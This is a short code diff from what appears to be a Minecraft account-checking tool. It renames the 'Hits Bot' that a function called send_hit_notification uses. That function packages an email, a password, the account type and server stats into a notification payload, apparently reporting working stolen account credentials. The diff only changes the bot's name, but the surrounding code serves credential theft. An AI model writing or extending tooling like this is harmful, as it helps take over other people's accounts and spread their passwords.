@@ -25,7 +25,7 @@ def send_hit_notification(email, password, account_type="Minecraft Java", capes=
     donut_stats_block = f"Status: {donut_status}\nReason: {donut_reason}\nTime Left: {donut_time}\nMoney: {donut_money}\nPlaytime: {donut_playtime}"
 
     payload = {
-        "username": "Nexus V2 Hits Bot",
+        "username": "Demon V2 Hits Bot",
         "embeds": [
             {
                 "color": 16753920,
